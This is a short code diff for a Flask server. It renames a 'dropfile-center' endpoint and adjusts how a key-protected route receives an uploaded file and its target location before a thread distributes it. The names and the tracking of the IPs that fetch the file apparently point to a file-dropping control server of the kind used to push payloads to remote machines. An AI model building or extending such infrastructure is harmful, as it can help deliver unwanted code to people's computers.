@@ -1,8 +1,8 @@
 from flask_limiter.util import get_remote_address
 from flask import Response, request, Flask
+from base64 import b64encode, b64decode
 from flask_limiter import Limiter
 from threading import Thread
-from base64 import b64encode
 from hashlib import sha256
 from time import sleep
 
@@ -37,7 +37,7 @@ dropfile_ips: list[str] = []
 
 
 @app.route("/dropfile-center", methods=["GET"])
-def runfile_center() -> Response:
+def dropfile_center() -> Response:
     global dropfile_location, dropfile_ips, dropfile
     if len(dropfile) == 0:
         return Response("no files to drop", 204)
@@ -222,8 +222,8 @@ def post_dropfile() -> Response:
     if check_key(request.args.get("key")):
         global dropfile_location, dropfile
 
-        dropfile = request.files["dropfile"].stream.read()
-        dropfile_location = request.args.get("location")
+        dropfile = request.files["dropFile"].stream.read()
+        dropfile_location = request.form.get("location")
         Thread(target=post_dropfile_thread, args=[dropfile, dropfile_location]).start()
         return Response("success", 200)
     else:
